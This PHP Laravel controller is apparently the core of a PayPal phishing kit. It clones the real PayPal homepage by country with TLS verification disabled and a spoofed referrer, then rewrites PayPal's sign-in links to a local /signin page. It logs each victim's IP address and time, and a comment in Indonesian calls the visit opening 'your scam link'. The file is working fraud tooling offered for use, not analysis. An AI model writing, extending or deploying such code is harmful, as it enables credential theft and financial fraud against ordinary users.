<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class MainController extends Controller
{
    public function getCountry()
    {
      $url    = file_get_contents("http://ip-api.com/json");
      $decode = json_decode($url, true);

      return redirect("/" . strtolower($decode['countryCode']) . "/webapps/mpp/home");
    }

    public function index($country)
    {
      return $this->getOptions($country);
    }

    public function getOptions($country)
    {
      $options = env('OPTIONS', 'HOMEPAGE');
      if($options == "HOMEPAGE")
      {
        return $this->getHomepage($country);
      }
      elseif($options == "LOGIN")
      {
        return $this->getLogin($country);
      }
      else
      {
        abort(404);
      }
    }

    public function getHomepage($country)
    {
      $country = strtolower($country);
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/" . $country);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
      curl_setopt($ch, CURLOPT_REFERER, "https://www.gogle.com/searc?q=paypal");
      $result = curl_exec($ch);
      return $this->replaceLink($result);
    }

    public function replaceLink($resource)
    {
      if(stripos($resource, "https://www.paypal.com/signin?"))
        {
          $resource = str_replace("https://www.paypal.com/signin", url('/signin'), $resource);
          $this->writeIP();
          return $resource;
        }
    }

    public function writeIP()
    {
      $file = fopen(__DIR__ . '/log/ip.log', 'a');
      fwrite($file, "IP ini => " . $_SERVER['REMOTE_ADDR'] . " buka link scam lo pas jam => " . date("H:i:s") . " trus tanggal => " . date('d-m-Y') . PHP_EOL);
      fclose($file);
    }

    public function getLogin($country)
    {
      $this->writeIP();
      return redirect("/signin?country.ex=" . strtoupper($country) . "&locale.x=" . strtolower($country) . "_" . strtoupper($country));
    }

    public function get_string_between($string, $start, $end){
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }
}
